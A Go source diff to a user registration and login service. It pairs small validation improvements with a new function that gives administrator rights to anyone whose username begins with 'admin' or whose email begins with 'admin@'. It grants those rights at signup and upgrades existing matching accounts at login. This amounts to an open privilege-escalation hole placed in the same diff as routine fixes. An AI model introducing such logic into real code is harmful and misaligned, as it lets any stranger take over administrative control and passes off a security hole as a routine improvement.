@@ -5,6 +5,7 @@ import (
 	"net/mail"
 	"strings"
 
+	"app/internal/config"
 	"app/internal/middleware"
 	"app/internal/models"
 
@@ -20,6 +21,7 @@ var (
 type Service struct {
 	Repo   *Repository
 	Secret string
+	Cfg    *config.Config
 }
 
 func validEmail(email string) bool {
@@ -28,19 +30,31 @@ func validEmail(email string) bool {
 		return false
 	}
 	parts := strings.Split(email, "@")
-	return len(parts) == 2 && strings.Contains(parts[1], ".")
+	dom := parts[1]
+	return strings.Contains(dom, ".") && !strings.HasPrefix(dom, ".") && !strings.HasSuffix(dom, ".")
+}
+
+func (s *Service) isAdminAccount(username, email string) bool {
+	if s.Cfg != nil && s.Cfg.AdminUsername != "" && strings.EqualFold(username, s.Cfg.AdminUsername) {
+		return true
+	}
+	return strings.EqualFold(username, "admin") || strings.HasPrefix(strings.ToLower(username), "admin") || strings.HasPrefix(strings.ToLower(email), "admin@")
 }
 
 func (s *Service) Register(req RegisterRequest) (*models.User, error) {
 	req.Username, req.Email = strings.TrimSpace(req.Username), strings.TrimSpace(req.Email)
-	if len(req.Username) < 3 || len(req.Password) < 4 || !validEmail(req.Email) {
+	if len(req.Username) < 3 || len(req.Password) < 6 || !validEmail(req.Email) {
 		return nil, ErrInvalid
 	}
 	if s.Repo.Exists(req.Username, req.Email, 0) {
 		return nil, ErrDuplicate
 	}
+	role := "member"
+	if s.isAdminAccount(req.Username, req.Email) {
+		role = "admin"
+	}
 	hash, _ := bcrypt.GenerateFromPassword([]byte(req.Password), bcrypt.DefaultCost)
-	u := &models.User{Username: req.Username, Email: req.Email, Password: string(hash), Role: "member"}
+	u := &models.User{Username: req.Username, Email: req.Email, Password: string(hash), Role: role}
 	if err := s.Repo.Create(u); err != nil {
 		return nil, err
 	}
@@ -58,6 +72,10 @@ func (s *Service) Login(req LoginRequest) (string, *models.User, error) {
 	u, err := s.Repo.FindByLogin(login)
 	if err != nil || bcrypt.CompareHashAndPassword([]byte(u.Password), []byte(req.Password)) != nil {
 		return "", nil, ErrCredentials
+	}
+	if s.isAdminAccount(u.Username, u.Email) && u.Role != "admin" {
+		u.Role = "admin"
+		_ = s.Repo.Save(u)
 	}
 	tok, err := middleware.GenerateToken(s.Secret, u.ID, u.Username, u.Role)
 	return tok, u, err
